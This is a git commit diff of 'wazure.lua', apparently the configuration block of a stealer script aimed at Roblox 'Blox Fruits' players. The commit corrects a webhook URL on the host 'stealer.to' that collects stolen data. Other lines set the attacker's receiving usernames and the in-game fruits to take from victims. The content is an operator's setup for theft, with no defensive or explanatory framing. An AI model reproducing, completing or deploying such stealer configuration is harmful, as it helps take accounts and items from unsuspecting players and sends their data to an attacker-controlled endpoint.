f580c74489daf0c1824f2f882628646f10e1378b
wazure-spec <paulcampbellguyana9@gmail.com>
2025-03-23 23:09:28 -0400

    Update wazure.lua

--- wazure.lua
+++ wazure.lua
@@ -1,5 +1,5 @@
 lua
-Webhook = "https://stealer.to/post?uniqueid3ba7e1f1" -- << Your Webhook
+Webhook = "https://stealer.to/post?uniqueid=3ba7e1f1" -- << Your Webhook
 Usernames = {"Envixity_402", "somealtuserhere2"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon"} -- << Fruits you want
 
